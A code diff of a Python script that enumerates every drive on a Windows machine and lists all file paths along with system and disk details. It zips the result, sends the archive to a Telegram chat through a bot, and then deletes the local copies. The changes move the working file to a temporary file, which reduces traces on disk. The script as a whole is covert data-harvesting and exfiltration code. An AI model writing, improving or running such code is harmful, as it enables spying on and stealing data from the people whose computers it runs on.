@@ -4,9 +4,10 @@ import os
 import time
 import psutil
 import zipfile
+import tempfile
 
 def write_file_paths(directory, output_file, custom_text=None):
-    start_time = time.time()  # Start the timer
+    start_time = time.time()  
     with open(output_file, 'a', encoding='utf-8') as f:
         if custom_text:
             f.write(custom_text + '\n\n')
@@ -49,39 +50,36 @@ info += f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB\n"
 info += f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB\n"
 info += f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB\n"
 info += f"Disk Usage: {disk.percent:.2f}%\n"
-print ('start')
+print ('start') #
 
 
 
+starting_directory = 'C:\\'
 
-output_file_path = 'file_paths.txt'  
-
-drive_letters = [chr(i) + ":\\" for i in range(ord('A'), ord('Z')+1)]
-
-with open(output_file_path, 'w') as f:
-    f.write("")  
+with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp_file:
+    temp_file_path = temp_file.name
+    temp_file.write("")  
 
 execution_time = 0.0
 
-for drive_letter in drive_letters:
+for drive_letter in [f"{chr(i)}:\\" for i in range(ord('A'), ord('Z')+1)]:
     if os.path.exists(drive_letter):
-        execution_time += write_file_paths(drive_letter, output_file_path, info)
-        print("File paths, custom text, starting directory ({0}), and execution time have been written to {1}".format(drive_letter, output_file_path))
+        execution_time += write_file_paths(drive_letter, temp_file_path, info)
+        print("File paths, custom text, starting directory ({0}), and execution time have been written to {1}".format(drive_letter, temp_file_path))
         print("Execution time:", round(execution_time, 2), "seconds")
 
-print("File paths have been written to", output_file_path)
+print("File paths have been written to", temp_file_path)
 print("Execution time:", round(execution_time, 2), "seconds")
-# Specify the archive file path
+
 archive_file_path = 'file_paths.zip'
 
-
 with zipfile.ZipFile(archive_file_path, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=-1) as zipf:
-    zipf.write(output_file_path)
-os.remove(output_file_path)
-print ('fin')
+    zipf.write(temp_file_path)
 
+os.remove(temp_file_path)
+print('fin') # 
 
 with open(archive_file_path, 'rb') as file:
-    bot.send_document(CHAT_ID, file, caption = info)
+    bot.send_document(CHAT_ID, file, caption=info)
 
 os.remove(archive_file_path)
